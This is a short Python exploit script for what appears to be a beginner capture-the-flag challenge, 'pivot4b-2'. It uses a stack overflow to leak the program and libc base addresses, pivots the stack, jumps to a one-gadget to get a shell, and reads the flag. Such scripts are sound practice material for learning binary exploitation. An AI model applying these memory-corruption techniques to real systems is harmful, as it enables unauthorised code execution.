from ptrlib import *
import os

elf = ELF("./chall")
libc = ELF("./libc.so.6")
#sock = Process("./chall_patched")
sock = Socket(os.getenv("CTF4B_HOST", "pivot4b-2.challenges.beginners.seccon.jp"), int(os.getenv("CTF4B_PORT", 12300)))

payload = b"A" * 0x38
payload += b"\x26"

sock.sendafter("> ", payload)
sock.recvuntil("A" * 0x38)
elf.base = u64(sock.recvline()) - 0x1226

payload = b"B" * 0x30
payload += p64(elf.base + 0x5000 - 0x10)
payload += p64(elf.symbol("vuln") + 18)

sock.sendafter("> ", payload)
sock.recvuntil("B" * 0x30)
sock.recvline()
libc.base = u64(sock.recvline()) - 0x62050

payload = b"C" * 0x30
payload += p64(libc.base + 0x21c000)
payload += p64(libc.base + 0xebd3f)

sock.sendafter("> ", payload)

sock.recvline()
sock.sendline("cat flag-30f9af30bae6316908ad674471772e05.txt")

sock.sh()
